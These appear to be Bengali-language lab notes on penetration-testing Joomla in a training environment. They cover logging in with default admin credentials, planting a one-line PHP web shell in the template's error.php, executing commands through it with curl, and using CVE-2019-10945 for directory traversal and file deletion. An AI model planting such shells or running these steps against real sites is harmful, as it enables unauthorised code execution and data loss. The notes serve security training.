## 1. Abusing Built-In Functionality

Joomla-তে admin backend access পেলে template edit করে PHP code execute করে RCE (Remote Code Execution) পাওয়া সম্ভব।

আগের section-এ পাওয়া credentials: `admin:admin`

Admin panel: `http://dev.inlanefreight.local/administrator`

### Admin panel error fix

Login-এর পরে এই error এলে:

`An error has occurred. Call to a member function format() on null`

নিচের URL-এ গিয়ে Quick Icon - PHP Version Check plugin disable করতে হবে:

`http://dev.inlanefreight.local/administrator/index.php?option=com_plugins`

এতে control panel ঠিকভাবে display হবে।

### Template edit করে RCE

1\. Admin panel-এ Configuration → Templates-এ যাও।

`http://dev.inlanefreight.local/administrator/index.php?option=com_templates`

[J3.x:How to use the Template Manager - Joomla! Documentation](https://images.openai.com/static-rsc-4/xgUshnV7msiLLk0sEByvWFSHaYpvVtAJ_whJ5ix0ZrdpH_X_ipHv4Eg7QK6Z0eBhps5_Iebh8PECXuEeh4m1zC6fhAPSFz79YNXe6LgdAkHOCN1Zmv62gIafJ7cxZZEP2O-ivObaCI_NtYRhKp7XeSDEma_tQWpKXOX_RZaUBO0?purpose=inline)

[docs.joomla.org](https://docs.joomla.org/J3.x%3AHow_to_use_the_Template_Manager?utm_source=chatgpt.com)

2. `Template` column থেকে `protostar` নির্বাচন করো।

   `http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506`
3. `error.php` file খুলে নিচের PHP code যোগ করো।

```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

Template editor URL:

`http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D`


[olivierkonate.medium.com](https://olivierkonate.medium.com/daily-bugle-tryhackme-writeup-9548f549a48e?utm_source=chatgpt.com)

Web shell-এর filename ও parameter যেন সহজে অনুমান করা না যায়, সে জন্য non-standard নাম ব্যবহার করা ভালো। প্রয়োজনে password protection ও source IP restriction ব্যবহার করা যায়।

4\. Save & Close চাপো এবং `cURL` দিয়ে command execution পরীক্ষা করো।

```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

এরপর interactive reverse shell নিয়ে local privilege escalation বা corporate network-এ lateral movement খোঁজা যায়।

মনে রাখবে: কাজ শেষে `error.php` থেকে PHP snippet সরাতে হবে। Report appendix-এ পরিবর্তনের বিবরণ দিতে হবে। Web shell-এর filename, file hash ও location final report-এ উল্লেখ করতে হবে।

## 2. Leveraging Known Vulnerabilities

[Joomla CVE statistics](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html?utm_source=chatgpt.com) অনুযায়ী, লেখার সময় Joomla-সম্পর্কিত 426টি vulnerability CVE পেয়েছিল।

কোনো vulnerability-এর CVE থাকলেই সেটি exploitable হবে বা public PoC থাকবে—এমন নয়। Joomla core-এর critical RCE vulnerability বিরল; `exploit-db`-তে 1,400-এর বেশি Joomla entry রয়েছে, যার বেশিরভাগ extensions-এর জন্য।

### CVE-2019-10945

Target `http://dev.inlanefreight.local/`-এ Joomla version `3.9.4` পাওয়া গিয়েছিল।

- [Joomla 3.9.4 release](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html?utm_source=chatgpt.com): March 2019
- September 2021-এ Joomla `4.0.3` ছিল; তাই `3.9.4` পুরোনো হলেও বাস্তব assessment-এ পাওয়া সম্ভব।
- [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945\&utm_source=chatgpt.com): Directory Traversal ও authenticated file deletion vulnerability।
- [Exploit-DB PoC](https://www.exploit-db.com/exploits/46710?utm_source=chatgpt.com)
- [Python 3 version](https://github.com/dpgg101/CVE-2019-10945?utm_source=chatgpt.com)

এই vulnerability ব্যবহার করে webroot ও অন্যান্য directory-এর contents list করা যায়। File deletion-ও সম্ভব, তবে এটি recommended নয়। Application URL দিয়ে access করা গেলে sensitive configuration file বা credentials-যুক্ত script পাওয়া যেতে পারে। Webserver user-এর permission থাকলে প্রয়োজনীয় file delete করে ক্ষতিও করা সম্ভব।
